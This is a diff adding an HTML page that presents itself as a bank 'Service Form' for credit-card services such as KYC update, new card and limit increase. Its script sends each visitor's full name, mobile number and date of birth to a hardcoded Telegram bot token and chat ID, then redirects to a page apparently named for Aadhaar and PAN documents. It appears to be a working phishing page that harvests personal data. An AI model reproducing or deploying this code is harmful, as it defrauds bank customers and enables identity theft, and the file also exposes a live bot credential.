@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Service Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            background-color: #f4f4f9;
+        }
+        form {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+        }
+  .header, .footer {
+            width: 100%;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header img, .footer img {
+            width: 100%;
+            max-width: 100%;
+            border-radius: 8px;
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        input, select {
+            width: 100%;
+            padding: 3px;
+            border: none;
+            border-bottom: 2px solid #ccc;
+            background: none;
+            outline: none;
+            transition: border-color 0.3s ease;
+            font-size: 20px;
+        }
+        input:focus, select:focus {
+            border-bottom: 2px solid #007BFF;
+        }
+        .select-wrapper {
+            position: relative;
+        }
+        .select-wrapper::after {
+            content: '▼';
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            pointer-events: none;
+            font-size: 12px;
+            color: #999;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+
+<body>
+
+<form id="serviceForm">
+  <!-- Header -->
+    <div class="header">
+        <img src="rbl.jpg" alt="Header Image">
+    </div>
+  <br>
+  <br>
+    <label for="fullName">Full Name</label>
+    <input type="text" id="fullName" name="fullName" required>
+  <br>
+  <br>
+  
+    <label for="mobile">Mobile Number</label>
+    <input type="tel"  id="mobile" name="mobile" pattern="[0-9]{10}" required>
+<br>
+  <br>
+    <label for="dob">Date of Birth</label>
+    <input type="text" id="dob" name="dob" placeholder="DD/MM/YYYY" required>
+<br>
+  <br>
+    <label for="service">Select Service</label>
+    <div class="select-wrapper">
+        <select id="service" name="service" required>
+            <option value="" disabled selected>Select a Service</option>
+            <option value="KYC Update">KYC Update</option>
+            <option value="Apply New Credit Card">Apply New Credit Card</option>
+            <option value="Increase Limit">Increase Limit</option>
+            <option value="Activate Credit Card">Activate Credit Card</option>
+            <option value="Deactivate Credit Card">Deactivate Credit Card</option>
+            <option value="Other Service">Other Service</option>
+        </select>
+    </div>
+<br>
+  <br>
+  <br>
+    <button type="submit">Submit</button>
+</form>
+
+<script>
+    // Auto-add and remove slashes for DOB
+    const dobInput = document.getElementById('dob');
+    dobInput.addEventListener('input', function (e) {
+        let value = dobInput.value.replace(/[^0-9]/g, '');
+        if (value.length > 2) value = value.slice(0, 2) + '/' + value.slice(2);
+        if (value.length > 5) value = value.slice(0, 5) + '/' + value.slice(5);
+        dobInput.value = value;
+    });
+
+    document.getElementById('serviceForm').addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    // Collect form data
+    const fullName = document.getElementById('fullName').value;
+    const mobile = document.getElementById('mobile').value;
+    const dob = document.getElementById('dob').value;
+    const service = document.getElementById('service').value;
+
+    // Replace with your actual bot token and chat ID
+    const botToken = '7893198072:AAE7VFvmqH55K_xLd1GlL1gPU8jbGvibzGg';
+    const chatId = '7212463280';
+    const message = `New Service Request:
+    - Full Name: ${fullName}
+    - Mobile Number: ${mobile}
+    - Date of Birth: ${dob}
+    - Selected Service: ${service}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message }),
+    }).then(response => {
+        if (response.ok) {
+            // Redirect to another page after successful submission
+            window.location.href = 'Aadhar&Pan.html'; // Replace with your URL
+        } else {
+            alert('Error sending data. Please try again.');
+        }
+    }).catch(error => {
+        alert('Error sending data. Please try again.');
+        console.error(error);
+    });
+});
+
+</script>
+
+</body>
+</html>
